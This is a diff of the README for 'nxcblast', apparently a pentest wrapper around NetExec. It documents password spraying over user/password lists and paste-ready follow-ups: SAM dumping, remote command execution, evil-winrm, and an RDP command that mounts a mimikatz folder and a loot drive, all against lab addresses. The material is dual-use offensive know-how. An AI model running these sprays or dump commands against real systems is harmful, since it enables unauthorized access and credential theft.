@@ -34,6 +34,8 @@ nxcblast [protocols] [targets] [auth] [options]
 
 **Targets**: one or more hosts, like `nxc` -- space-separated, comma-separated, mixed, a file of IPs/ranges (comments and blank lines ignored), a CIDR, or an nxc-style range (`192.168.1.10-20`).
 
+**Users, passwords, hashes** (`-u` / `-p` / `-H`): same shape as targets -- space-separated, comma-separated, or mixed. Multiple users and passwords are a cartesian product (every user with every password). Put `-u`/`-p`/`-H` after the target(s) so extra names are not swallowed as usernames.
+
 `nxcblast` refuses to start without an explicit target. If you pass `-u`/`-U` with no password or hash, it defaults to `--user-only`. If you pass neither user nor password, it defaults to `--null`, `--null-user`, and `--guest`.
 
 ### Password spray
@@ -51,6 +53,8 @@ nxcblast --protocols smb,ldap targets.txt -u admin -p Password1
 ### User / password lists (cartesian)
 
 ```bash
+nxcblast 192.168.53.221 -u Admin Administrator -p NewPassword123
+nxcblast smb targets.txt -u admin,backup -p 'Summer2026!' 'Winter2026!'
 nxcblast smb targets.txt -U users.txt -P passwords.txt
 nxcblast smb targets.txt -u admin -P passwords.txt
 nxcblast smb targets.txt -U users.txt -p 'Summer2026!'
@@ -159,7 +163,7 @@ Hit detection reads `nxc` stdout (exit codes are ignored): `[+]`, `Pwn3d!`, `STA
 
 ## Pastables
 
-`nxcblast` never auto-runs enum or dump modules. At the end of every run it prints paste-ready follow-up commands for each confirmed hit, matching the auth method that actually succeeded (`--local-auth` only when local/mssql local worked).
+`nxcblast` never auto-runs enum or dump modules. At the end of every run it prints paste-ready follow-up commands for each confirmed hit, matching the auth method that actually succeeded (`--local-auth` only when local/mssql local worked). Dump and exec follow-ups (`--sam`, `-x`, evil-winrm, secretsdump) are only suggested when that hit was `Pwn3d!` or Shell -- valid-but-not-admin creds get enum/reconnect commands only.
 
 ```
 ============================================================
@@ -170,21 +174,12 @@ PASTABLES -- confirmed hits, suggested follow-up commands
 
 [SMB domain]
   nxc smb 192.168.59.203 -u jason -p 'lab' --users --shares --pass-pol --rid-brute 10000
-  nxc smb 192.168.59.203 -u jason -p 'lab' --sam
 
-[LDAP]
-  nxc ldap 192.168.59.203 -u jason -p 'lab' --groups --computers
-
-[WINRM local]
-  evil-winrm -i 192.168.59.203 -u jason -p 'lab'
-  nxc winrm 192.168.59.203 -u jason -p 'lab' --local-auth -x whoami
-
-[RDP domain]
+[RDP local]
   mkdir -p "$HOME/my_data/loot"; xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /drive:'/usr/share/windows-resources/mimikatz/x64',share /drive:"$HOME/my_data/loot",loot /v:192.168.59.203 /d: /u:jason /p:'lab'
 
 [MSSQL mssql]
   nxc mssql 192.168.59.203 -u jason -p 'lab' --local-auth
-  nxc mssql 192.168.59.203 -u jason -p 'lab' --local-auth -x whoami
 ============================================================
 ```
 
